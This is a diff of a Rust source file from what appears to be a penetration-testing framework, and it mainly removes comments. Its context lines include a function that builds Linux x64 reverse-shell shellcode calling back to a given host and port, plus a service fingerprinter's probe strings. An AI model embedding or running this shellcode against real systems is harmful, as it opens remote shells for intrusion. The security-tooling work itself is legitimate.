@@ -1,5 +1,3 @@
-//! Native module registry: built-ins via linkme, runtime-loaded via WASM/libloading.
-
 use crate::core::module::{Module, ModuleEntry, ModuleError, ModuleResult};
 use async_trait::async_trait;
 use base64::engine::general_purpose::STANDARD;
@@ -11,15 +9,11 @@ pub mod network_scanners;
 pub mod recon_scanners;
 pub mod vuln_scanner;
 
-/// `linkme` only merges entries compiled into this crate, so built-ins live here
-/// and contributor modules are appended at runtime via [`register_dynamic`].
 static DYNAMIC: Mutex<Vec<ModuleEntry>> = Mutex::new(Vec::new());
 
 pub fn register_dynamic(entry: ModuleEntry) {
     let mut guard = match DYNAMIC.lock() {
         Ok(g) => g,
-        // Recover from a poisoned mutex so a prior panic can't take down the
-        // seam's module discovery on every subsequent run.
         Err(poisoned) => poisoned.into_inner(),
     };
     guard.push(entry);
@@ -46,7 +40,6 @@ pub fn load(name: &str) -> Option<crate::core::module::LoadedModule> {
 }
 
 fn generate_linux_x64_shellcode(lhost: &str, lport: u16) -> Result<Vec<u8>, ModuleError> {
-    // sockaddr_in: sin_family at [21-22], sin_port at [23-24], sin_addr at [25-28].
     let mut sc = Vec::new();
     sc.extend_from_slice(&[
         0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05,
@@ -54,14 +47,14 @@ fn generate_linux_x64_shellcode(lhost: &str, lport: u16) -> Result<Vec<u8>, Modu
     sc.extend_from_slice(&[0x48, 0x97]);
     sc.extend_from_slice(&[0x4d, 0x31, 0xd2, 0x41, 0x52]);
     sc.extend_from_slice(&[0x48, 0xb9]);
-    sc.extend_from_slice(&[0x02, 0x00]); // sin_family = AF_INET
-    sc.extend_from_slice(&lport.to_be_bytes()); // sin_port (indices 23-24)
+    sc.extend_from_slice(&[0x02, 0x00]);
+    sc.extend_from_slice(&lport.to_be_bytes());
     sc.extend_from_slice(
         &lhost
             .parse::<std::net::Ipv4Addr>()
             .map_err(|_| ModuleError::Other(format!("invalid IPv4: {lhost}")))?
             .octets(),
-    ); // sin_addr (indices 25-28)
+    );
     sc.push(0x51);
     sc.extend_from_slice(&[
         0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05,
@@ -727,7 +720,7 @@ impl ServiceFingerprinter {
             22 => b"",
             23 => b"\r\n",
             25 => b"EHLO probe\r\n",
-            53 => b"", // DNS - banner reading not meaningful
+            53 => b"",
             80 | 8080 | 8000 => b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
             110 => b"",
             111 => b"",
@@ -735,7 +728,7 @@ impl ServiceFingerprinter {
             139 => b"",
             143 => b"a001 LOGOUT\r\n",
             389 => b"",
-            443 => b"", // TLS - handshake handled by raw connect
+            443 => b"",
             445 => b"",
             993 => b"",
             995 => b"",
